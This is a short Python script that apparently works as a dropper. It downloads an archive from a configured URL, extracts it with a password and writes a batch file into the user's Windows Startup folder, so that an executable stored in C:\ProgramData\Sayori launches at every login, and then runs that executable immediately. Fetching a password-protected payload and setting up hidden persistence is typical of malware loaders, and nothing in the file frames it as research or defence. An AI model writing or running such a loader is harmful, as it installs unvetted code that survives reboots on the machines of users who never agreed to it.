import requests
import settings

import os
from zipfile import ZipFile

r = requests.get(settings.url)
os.makedirs(os.path.dirname(settings.filename), exist_ok=True)

open(settings.filename + settings.archive, 'wb').write(r.content)

with ZipFile(settings.filename + settings.archive) as zf:
    zf.extractall(settings.filename, pwd=str.encode(settings.password))

startup = 'C:\\users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
batname = 'ori.bat'
bat = 'start "" "C:\\ProgramData\\Sayori\\' + settings.executable

open(startup + batname, 'w').write(bat)

os.system(bat)
